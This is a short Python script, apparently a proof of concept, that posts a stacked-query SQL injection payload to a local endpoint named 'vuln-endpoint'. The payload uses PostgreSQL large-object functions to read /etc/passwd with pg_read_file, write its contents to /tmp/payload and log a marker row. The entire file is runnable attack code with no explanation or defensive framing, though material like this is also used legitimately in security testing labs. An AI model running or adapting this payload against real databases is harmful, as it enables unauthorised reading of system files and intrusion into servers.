import requests

TARGET_URL = "http://localhost:5000/vuln-endpoint"

def trigger_sql_injection():
    sql_payload = """
    ; DO $$
    DECLARE
        loid oid;
    BEGIN
        loid := lo_create(0);
        PERFORM lo_put(loid, 0, pg_read_file('/etc/passwd')::bytea);
        PERFORM lo_export(loid, '/tmp/payload');
        INSERT INTO test (id) VALUES ('Exploit ran with loid ' || loid::text);
    END $$;
    """
    
    response = requests.post(TARGET_URL, data={"input": sql_payload}, headers={"Content-Type": "application/x-www-form-urlencoded"})
    
    print("[+] SQL Injection executed.")
    print("[+] Response:", response.text)

trigger_sql_injection()
